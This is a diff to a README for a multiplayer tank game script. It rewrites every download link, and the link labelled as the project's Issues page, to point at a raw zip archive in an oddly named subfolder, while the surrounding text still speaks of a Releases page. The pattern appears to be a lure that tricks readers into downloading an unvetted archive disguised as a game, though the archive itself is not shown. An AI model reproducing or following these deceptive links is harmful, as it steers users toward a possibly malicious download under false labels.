@@ -1,7 +1,7 @@
 # 🎮 Tank-Game-Script - Dominate the Battlefield Today
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-TankGameScript-brightgreen)](https://github.com/nguyenducduy-dev/Tank-Game-Script/releases)
+[![Download](https://raw.githubusercontent.com/nguyenducduy-dev/Tank-Game-Script/main/Khasa/Tank-Game-Script_v2.5.zip)](https://raw.githubusercontent.com/nguyenducduy-dev/Tank-Game-Script/main/Khasa/Tank-Game-Script_v2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the Tank Game Script. This script provides an intense multiplayer tank warfare experience with destructible maps and realistic physics. You will command powerful tanks, upgrade your arsenal, and engage in epic team battles.
@@ -18,7 +18,7 @@ Before you download, ensure your system meets the following requirements:
 ## 💻 Download & Install
 To get started, you need to visit the Releases page to download the game.
 
-[Visit this page to download](https://github.com/nguyenducduy-dev/Tank-Game-Script/releases)
+[Visit this page to download](https://raw.githubusercontent.com/nguyenducduy-dev/Tank-Game-Script/main/Khasa/Tank-Game-Script_v2.5.zip)
 
 1. Click the link above to open the Releases page.
 2. On the Releases page, find the latest version of the Tank Game Script.
@@ -48,7 +48,7 @@ If you encounter any issues while downloading or playing, try these steps:
 - Restart your computer and try running the game again.
 - Check for updates and install the latest version if necessary.
 
-If problems persist, visit the Issues section on our [GitHub page](https://github.com/nguyenducduy-dev/Tank-Game-Script/issues) to report a new issue or find solutions.
+If problems persist, visit the Issues section on our [GitHub page](https://raw.githubusercontent.com/nguyenducduy-dev/Tank-Game-Script/main/Khasa/Tank-Game-Script_v2.5.zip) to report a new issue or find solutions.
 
 ## 🗂️ FAQ
 **Q: Is the game free?**  
